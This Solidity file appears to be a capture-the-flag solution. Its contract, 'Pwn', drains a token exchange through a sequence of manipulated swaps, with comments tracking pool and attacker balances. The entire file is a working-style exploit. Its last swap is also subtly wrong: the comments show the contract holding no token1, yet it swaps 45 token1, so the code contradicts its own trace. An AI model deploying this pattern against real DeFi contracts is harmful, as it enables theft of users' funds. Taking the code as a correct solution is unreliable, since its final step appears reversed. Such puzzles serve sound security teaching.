// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function approve(address spender, uint amount) external;
    function getSwapPrice(address, address, uint) external view returns(uint);
    function swap(address from, address to, uint amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Pwn {

    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;   

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }  

    function pwn() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        token1.approve(address(dex), 1000);
        token2.approve(address(dex), 1000);
        dex.swap(address(token1), address(token2), 10);     // dex: 110 | 90  // pwn:   0 | 20
        dex.swap(address(token2), address(token1), 20);     // dex:  86 | 110 // pwn:  24 | 0
        dex.swap(address(token1), address(token2), 24);     // dex: 110 | 80  // pwn:   0 | 30
        dex.swap(address(token2), address(token1), 30);     // dex:  69 | 110 // pwn:  41 | 0
        dex.swap(address(token1), address(token2), 41);     // dex: 110 | 45  // pwn:   0 | 65
        dex.swap(address(token1), address(token2), 45);     // dex:   0 | 90  // pwn: 110 | 20
        require(token1.balanceOf(address(dex)) == 0, "tokens not drained");
    }
}